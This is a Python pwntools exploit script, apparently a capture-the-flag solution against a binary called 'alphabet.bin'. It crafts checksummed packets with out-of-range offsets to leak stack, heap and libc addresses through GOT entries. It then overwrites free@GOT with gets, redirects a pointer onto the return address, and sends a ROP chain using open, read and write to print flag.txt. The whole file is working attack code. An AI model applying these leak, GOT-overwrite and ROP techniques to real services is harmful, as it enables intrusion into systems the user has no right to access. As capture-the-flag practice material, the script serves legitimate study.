from pwn import *
from time import sleep
context.binary=e=ELF("./alphabet.bin")
libc=e.libc
def start():
    if args.LOCAL:
        p=e.process()
        if args.GDB:
            gdb.attach(p,gdbscript="""
            #b *0x0000000000401630
            b open
            """)
            pause()
    elif args.REMOTE:
        p=remote(args.HOST,int(args.PORT))
    return p
p=start()
def gen_payload(offset1: int, offset2: int,data: bytes) -> bytes:
    payload=b"\x5a\x08"
    payload+=p64(offset1)+p64(offset2)
    payload+=data
    final_byte=0
    for i in payload:
        final_byte+=i ^ 0x55
        final_byte = final_byte & 0xff
    payload+=p8(final_byte)
    sleep(1)
    return payload
#Leak stack
p.recvuntil(b"Running very important code and threads")
p.sendline(gen_payload(0xffffffffffffffbe,0,p64(0)))
p.recvuntil(b"Grabbed new alphabet characters: ")
stack_leak=u64(p.recv(6).ljust(8,b"\0"))
buffer_locate=stack_leak-64
log.info(f"buffer_locate: {hex(buffer_locate)}")
p.recvuntil(b"Running very important code and threads")
#Leak free
p.sendline(gen_payload( (e.got.free-buffer_locate-18) & (2**64-1) ,
                        0, 
                        p64(0)))
p.recvuntil(b"Grabbed new alphabet characters: ")
free_=u64(p.recv(6).ljust(8,b"\0"))
log.info(f"free: {hex(free_)}")
p.recvuntil(b"Running very important code and threads")
#Leak puts
p.sendline(gen_payload( (e.got.puts-buffer_locate-18) & (2**64-1) ,
                        0, 
                        p64(0)))
p.recvuntil(b"Grabbed new alphabet characters: ")
puts=u64(p.recv(6).ljust(8,b"\0"))
log.info(f"puts: {hex(puts)}")
p.recvuntil(b"Running very important code and threads")
libc.address=puts-libc.sym.puts
#Leak heap
p.sendline(gen_payload( 0xffffffffffffff8e ,
                        0, 
                        p64(0)))
p.recvuntil(b"Grabbed new alphabet characters: ")
heap=u64(p.recv(4).ljust(8,b"\0"))
log.info(f"heap: {hex(heap)}")
#free@got=gets
data_locate=0x1462+heap
p.sendline(gen_payload( (data_locate-buffer_locate-18) & (2**64-1) ,
                        (e.got.free-buffer_locate-18) & (2**64-1), 
                        p64(libc.sym.gets)))
p.recvuntil(b"Updated the alphabet")
p.sendline(b"shit")
#ptr@use_packet=return_addr
ptr_addr=buffer_locate-0x60
retr_addr=buffer_locate-0x28
data_locate=0x1462+heap
p.sendline(gen_payload( (data_locate-buffer_locate-18) & (2**64-1) ,
                        (ptr_addr-buffer_locate-18)  & (2**64-1), 
                        p64(retr_addr)))
p.sendline(b"shit1")
rdi_ret=libc.address+0x000000000002a3e5
rsi_ret=libc.address+0x000000000002be51
rdx_r12_ret=libc.address+0x000000000011f497
p.sendline(
    p64(rdi_ret)+p64(e.sym.global_alphabet)+
    p64(libc.sym.gets)+

    p64(rdi_ret)+p64(e.sym.global_alphabet)+
    p64(rsi_ret)+p64(0)+
    p64(libc.sym.open)+

    p64(rdi_ret)+p64(3)+
    p64(rsi_ret)+p64(e.sym.global_alphabet+8)+
    p64(rdx_r12_ret)+p64(0x60)+p64(0)+
    p64(libc.sym.read)+
    
    p64(rdi_ret)+p64(1)+
    p64(rsi_ret)+p64(e.sym.global_alphabet+8)+
    p64(rdx_r12_ret)+p64(0x60)+p64(0)+  
    p64(libc.sym.write)
)
p.sendline(b"flag.txt\00")
p.interactive()
